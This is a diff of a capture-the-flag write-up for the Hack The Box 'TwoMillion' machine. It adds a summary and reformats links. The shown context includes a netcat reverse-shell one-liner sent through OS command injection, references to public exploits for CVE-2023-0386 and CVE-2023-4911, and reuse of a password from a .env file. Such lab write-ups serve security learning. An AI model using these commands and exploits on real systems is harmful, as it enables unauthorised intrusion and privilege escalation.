@@ -3,6 +3,10 @@ layout: default
 title: TwoMillion
 ---
 
+## TL;DR
+
+We give admin privilege to our user using hidden endpoints on the server. We get `RCE` using `OS Command Injection`. We escalate to `admin` user using password for `mysql` service we find inside `.env`. From there we gain root privileges using two paths, one is known exploit in `OverlayFS`, and other is using known exploit in `ldd`, also known as `Looney Tunables`.
+
 ### Recon
 
 we start with `nmap`, using this command:
@@ -166,7 +170,7 @@ Content-Type: application/json
 
 ![change to admin](image-7.png)
 
-### Get reverse shell via command injection
+### Get reverse shell via OS Command Injection
 
 This entry point is very interesting, because we can supply our own filename to this endpoint:
 ```json
@@ -178,10 +182,11 @@ This entry point is very interesting, because we can supply our own filename to 
 Probably it interacts with os commands behind the scenes, when it `echo` our username or something.
 We can try inject `;` to execute another command, and then get the reverse shell.
 
-we'll use https://www.revshells.com/ to generate the reverse shell, ip `10.10.16.49` and port `770`.
+we'll use [https://www.revshells.com/](https://www.revshells.com/) to generate the reverse shell, ip `10.10.16.49` and port `770`.
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.49 770 >/tmp/f
 ```
+
 ![revershe shell generator](image-9.png)
 
 Now, let send the payload:
@@ -358,7 +363,7 @@ HTB Godfather
 
 Okay, we found some interesting mail, what is `OverlayFS / FUSE` ?
 
-when I googled, i found this https://github.com/puckiestyle/CVE-2023-0386.
+when I googled, i found this [https://github.com/puckiestyle/CVE-2023-0386](https://github.com/puckiestyle/CVE-2023-0386).
 
 I simply downloaded the PoC, execute `make all`, and then these two commands:
 ```bash
@@ -422,7 +427,7 @@ Written by Roland McGrath and Ulrich Drepper.
 
 Okay, when checking in the internet, we can see it is vulnerable to `CVE-2023-4911`, or "Looney Tunables".
 
-Let's use this PoC, just follow the orders on the README, https://github.com/NishanthAnand21/CVE-2023-4911-PoC.
+Let's use this PoC, just follow the orders on the README, [https://github.com/NishanthAnand21/CVE-2023-4911-PoC](https://github.com/NishanthAnand21/CVE-2023-4911-PoC).
 
 it takes some time, but it works at the end. (5~20 minutes)
 
